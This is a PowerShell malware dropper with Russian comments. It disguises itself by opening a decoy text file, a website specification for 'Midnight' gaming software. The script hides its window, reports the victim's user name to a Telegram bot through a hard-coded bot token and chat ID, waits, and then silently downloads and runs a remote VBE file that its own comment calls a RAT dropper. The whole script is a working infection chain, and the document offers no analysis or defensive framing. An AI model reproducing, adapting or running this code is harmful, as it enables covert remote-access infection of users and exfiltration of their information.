# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "midnight.IM игровой ассистент для игр (ТЗ).txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
1. Общая информация о проекте
Название проекта: сайт для программных обеспечений Midnight (для игр CS 2, GTA V, CS 1.6). Цель создания сайта: предоставление информации о ПО, поддержка пользователей, организация сообщества (форум).
Текущий статус: требуется полное создание сайта и перестройка с сохранением ключевого функционала (html).
Текущий сайт : https://midnight.im/ 

2. Целевая аудитория
Игроки, использующие специализированное ПО для игр (CS 2, GTA V, CS 1.6). Технические пользователи, заинтересованные в настройках и обновлениях ПО. Участники сообщества (форум).

3. Структура сайта
Обязательные разделы:
Главная страница — краткое описание проекта, ключевые ссылки, анонсы. 
О проекте — информация о ПО, история, команда.
Скачать — ссылки на актуальные версии ПО, инструкции.
Форум — дискуссионная площадка для пользователей (аналогично текущему сайту).
FAQ — ответы на частые вопросы, troubleshooting.
Контакты — способы связи, юридические данные.
Блог/Новости — обновления, патчи, анонсы.
Дополнительно: адаптивное меню, поисковая строка, футер с копирайтом.
ТЕКСТА И РАЗЛИЧНЫЕ ФОТО БЕРЁМ ИЗ СТАРОГО САЙТА https://midnight.im/. По запросу предоставляем новые фото и текста.

4. Функциональные требования
Форум:
Регистрация/авторизация пользователей.
Разделение на темы и подтемы.
Система рейтингов/репутации (опционально).
Модерация контента.
Личный кабинет пользователя (для зарегистрированных):
Профиль, настройки, история активности.

Админ‑панель:
Управление контентом (статьи, новости, форум).
Статистика посещений (базовая).
Резервное копирование данных.
Поиск по сайту — по контенту и форуму.
Форма обратной связи — для запросов и отчётов.
Защита от спама (CAPTCHA, фильтры).

5. Дизайн и пользовательский интерфейс
Цветовая гамма: чёрно‑голубая палитра.
Стиль: минимализм, акценты на читаемость текста и навигацию.
Адаптивность: полная поддержка мобильных устройств (смартфоны, планшеты).
Шрифты: современные, без засечек (например, Roboto, Open Sans).
Иконки: SVG‑формат, единообразный стиль.
Анимации: минимальные (навигация, hover‑эффекты).

6. Технические требования
Платформа: CMS на выбор исполнителя (например, WordPress с плагинами для форума, или самописная система).
Хостинг: совместимость с Linux/Apache/Nginx, PHP 7.4+, MySQL 5.7+.

Безопасность:
SSL‑сертификат (HTTPS).
Защита от SQL‑инъекций и XSS.
Скорость загрузки: не более 3 сек. для главной страницы (оптимизация изображений, кеширование).
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit